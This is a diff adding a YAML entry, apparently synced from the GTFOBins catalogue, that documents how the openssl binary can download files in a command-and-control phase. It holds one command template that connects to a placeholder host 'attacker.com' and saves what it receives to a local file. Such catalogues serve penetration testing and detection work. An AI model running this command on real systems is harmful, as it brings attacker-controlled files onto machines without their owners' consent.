@@ -1,0 +1,23 @@
+id: gtfobins/openssl/download/unprivileged
+type: binary
+platform: linux
+name: openssl
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
+references:
+- https://gtfobins.github.io/gtfobins/openssl/
+tags:
+- linux
+- unix
+- gtfobins
